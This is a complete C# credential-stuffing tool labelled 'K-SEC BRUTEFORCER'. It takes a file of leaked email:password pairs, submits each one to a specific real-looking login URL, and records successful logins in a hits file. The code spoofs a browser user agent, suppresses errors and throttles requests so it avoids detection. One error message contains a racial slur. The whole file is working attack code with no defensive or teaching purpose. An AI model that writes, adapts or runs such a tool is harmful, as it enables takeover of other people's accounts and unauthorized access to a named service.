using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

        Console.Clear();

        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine(@"██╗  ██╗     ███████╗███████╗ ██████╗ ");
        Console.WriteLine(@"██║ ██╔╝     ██╔════╝██╔════╝██╔════╝ ");
        Console.WriteLine(@"█████╔╝█████╗███████╗█████╗  ██║      ");
        Console.WriteLine(@"██╔═██╗╚════╝╚════██║██╔══╝  ██║      ");
        Console.WriteLine(@"██║  ██╗     ███████║███████╗╚██████╗ ");
        Console.WriteLine(@"╚═╝  ╚═╝     ╚══════╝╚══════╝ ╚═════╝ ");
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine("               K-SEC BRUTEFORCER • auth-kris.vercel.app");
        Console.WriteLine("═══════════════════════════════════════════════════════\n");
        Console.ResetColor();

        string loginUrl = "https://auth-kris.vercel.app/login";
        string successContains = "dashboard";

        Console.Write("Combo file path (example: C:\\tool\\found.txt) → ");
        Console.ForegroundColor = ConsoleColor.Yellow;
        string comboPath = Console.ReadLine()?.Trim();
        Console.ResetColor();

        if (!File.Exists(comboPath))
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\nFile not found. Check path nigga (use double \\ or /).");
            Console.ResetColor();
            Console.ReadKey();
            return;
        }

        string[] lines = File.ReadAllLines(comboPath);
        if (lines.Length == 0)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("File empty. Load combos.");
            Console.ResetColor();
            return;
        }

        string domain = "auth-kris.vercel.app";
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
        string folder = $"{domain}_{timestamp}";
        Directory.CreateDirectory(folder);
        string hitsFile = Path.Combine(folder, "success.txt");

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"\nTarget:       {loginUrl}");
        Console.WriteLine($"Success str:  {successContains}");
        Console.WriteLine($"Combos:       {lines.Length}");
        Console.WriteLine($"Hits save:    {hitsFile}\n");
        Console.ResetColor();

        Console.Write("ENTER to start...");
        Console.ReadLine();

        var handler = new HttpClientHandler
        {
            AllowAutoRedirect = true,
            UseCookies = true,
            CookieContainer = new CookieContainer(),
            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
        };

        using var client = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(25)
        };

        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36");

        int hits = 0;
        int tried = 0;

        foreach (string line in lines)
        {
            tried++;
            string[] parts = line.Split(new[] { ':' }, 2);
            if (parts.Length != 2) continue;

            string email = parts[0].Trim();
            string pass = parts[1].Trim();

            Console.Write($"\r[{tried}/{lines.Length}] {email,-35} ... ");

            try
            {
                var form = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("email", email),
                    new KeyValuePair<string, string>("password", pass)
                });

                var response = await client.PostAsync(loginUrl, form);
                string finalUrl = response.RequestMessage?.RequestUri?.ToString()?.ToLower() ?? "";

                if (finalUrl.Contains(successContains))
                {
                    hits++;
                    string hit = $"{email}:{pass} → {finalUrl}";

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[HIT #{hits}] {hit}");
                    Console.ResetColor();

                    File.AppendAllText(hitsFile, hit + Environment.NewLine);
                }
            }
            catch { /* silent fail */ }

            await Task.Delay(450); // slow enough to not get clapped fast
        }

        Console.WriteLine("\n");
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine($"Done. Hits: {hits}");
        Console.WriteLine($"Saved → {hitsFile}");
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine("\nK-SEC cooked it.");
        Console.ResetColor();

        Console.ReadKey();
    }
}
